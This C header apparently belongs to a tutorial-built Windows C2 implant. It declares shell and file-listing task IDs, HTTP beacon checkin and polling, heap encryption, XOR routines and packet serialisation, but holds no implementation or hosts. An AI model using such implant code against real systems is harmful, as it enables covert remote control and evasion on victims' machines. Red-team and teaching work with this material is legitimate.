#ifndef INTERNALS_H
#define INTERNALS_H

#include <windows.h>

// Task command IDs - must match the Go plugin on Day 10
#define CMD_EXIT   0x01
#define CMD_SHELL  0x02
#define CMD_PWD    0x03
#define CMD_LS     0x04


// Heap subsystem
PVOID Heap_Alloc ( SIZE_T size );
void  Heap_Free  ( PVOID ptr );
void  HeapCrypt  ( ULONG_PTR key );
PVOID Heap_Realloc( PVOID ptr, SIZE_T new_size );

// Memory subsystem
PVOID Mem_Alloc   ( SIZE_T size );
void  Mem_Free    ( PVOID ptr, SIZE_T size );
BOOL  Mem_Protect ( PVOID ptr, SIZE_T size, ULONG protect );

// HTTP Connection
PVOID Http_Open   ( PCHAR user_agent );
PVOID Http_Connect( PVOID h_internet, PCHAR host, UINT16 port );
BOOL  Http_Send   ( PVOID h_connect, PCHAR uri, BOOL use_ssl, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
void  Http_Close  ( PVOID handle );

BOOL Transport_Send    ( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
BOOL Transport_Checkin ();
BOOL Transport_Poll ( PVOID* out_buf, UINT32* out_len );
BOOL Task_Dispatch  ( PVOID buf, UINT32 buf_len );

void Beacon_Sleep( ULONG ms );

// Crypto subsystem
void Crypt_Xor    ( PVOID buf, SIZE_T size, ULONG_PTR key );
void Crypt_XorKey ( PVOID buf, SIZE_T size, PBYTE key, SIZE_T key_len );

// Wire packet types 
// Growing byte buffer used to build outgoing packets
typedef struct _PACKAGE {
    PVOID  Buffer;   // heap allocation holding the serialized bytes
    SIZE_T Length;   // bytes written so far (= current write position)
    PCHAR  TaskUUID; // UUID of the task this packet answers (can be null for checkin)
} PACKAGE, *PPACKAGE;

// Cursor over a received byte buffer
typedef struct _PARSER {
    PCHAR  Original; // start of the allocation (freed on Destroy)
    PCHAR  Buffer;   // current read cursor
    UINT32 Size;     // total size of the buffer
    UINT32 Length;   // bytes remaining from cursor to end
} PARSER, *PPARSER;

// Package functions 
PPACKAGE Pkg_Create  ( PCHAR agent_id );
void     Pkg_Int32   ( PPACKAGE pkg, INT32 val );
void     Pkg_Int64   ( PPACKAGE pkg, INT64 val );
void     Pkg_Bytes   ( PPACKAGE pkg, PVOID data, UINT32 size );
void     Pkg_Pad     ( PPACKAGE pkg, PVOID data, UINT32 size );
void     Pkg_Str     ( PPACKAGE pkg, PCHAR str );
BOOL     Pkg_Transmit( PPACKAGE pkg, PVOID *response, UINT32 *resp_size );
void     Pkg_Destroy ( PPACKAGE pkg );

// Parser functions
void   Psr_New    ( PPARSER psr, PVOID buf, UINT32 size );
INT32  Psr_Int32  ( PPARSER psr );
PBYTE  Psr_Bytes  ( PPARSER psr, UINT32 *out_size );
PCHAR  Psr_Str    ( PPARSER psr, UINT32 *out_size );
void   Psr_Pad    ( PPARSER psr, UINT32 size );
void   Psr_Destroy( PPARSER psr );

#endif // INTERNALS_H
